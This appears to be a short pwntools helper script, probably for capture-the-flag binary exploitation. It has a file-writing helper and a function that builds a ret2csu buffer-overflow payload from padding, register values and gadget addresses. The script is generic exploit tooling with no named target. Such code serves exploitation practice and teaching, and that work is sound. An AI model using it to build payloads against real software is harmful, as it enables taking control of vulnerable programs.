from pwn import *


def write_bins(bin, dir):
    with open(dir, 'wb') as f:
        f.write(bin)


def csu(buf, end_addr, rbx, rbp, r12, r13, r14, r15, front_addr, last):
    payload = buf * b'a' + p64(end_addr) + p64(0xdeadbeef) + \
              p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(front_addr) + \
              0x38 * b'a' + p64(last)

    return payload
